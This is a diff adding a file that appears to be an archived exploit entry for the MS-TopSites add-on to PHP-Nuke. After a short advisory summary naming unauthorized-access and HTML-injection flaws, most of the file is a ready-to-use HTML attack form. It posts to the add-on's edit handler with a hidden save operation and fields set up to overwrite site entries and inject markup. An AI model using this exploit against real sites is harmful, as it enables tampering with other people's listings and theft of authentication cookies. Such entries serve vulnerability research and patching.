@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/26358/info
+
+MS-TopSites is prone to an unauthorized-access vulnerability and an HTML-injection vulnerability because the application fails to sufficiently sanitize user-supplied data.
+
+An attacker can exploit these issues to gain elevated privileges on the affected application, execute arbitrary code within the context of the webserver, and steal cookie-based authentication credentials. 
+
+<html><title>PhpNuke (add-on) MS TopSites Edit Exploit And Html Injection</title>
+<body bgcolor="black" text="white">
+<form action="http://localhost:81/modules.php?name=MS_TopSites&file=edit " method="post">
+<input size="92" type="text" value=&#039;&#039; name="sname"> SiteNameTitle [sname] (not Target it must be changed in the source) <br />
+<input size="92" type="text" value="" name="uname"> Username [uname] <br />
+<input size="92" type="text" value=" http://www.0x90.com.ar" name="url"> Url<br />
+<input size="92" type="text" value="mail@url.com" name="email"> Email<br />
+<input size="92" type="text" value=&#039;&#039; name="bottonurl"> BottonUrl<br />
+<input size="92" type="text" value="Art" name="cat"> Cat <br />
+<input size="92" type="text" value="Wedonotneeddescriptions" name="description"> Descriptions<br />
+<input type="hidden" value="MSTopSitesSaveSite" name="op"><br />
+<input type="submit" value="submit"><br />
+</body></form>
+</html>
+
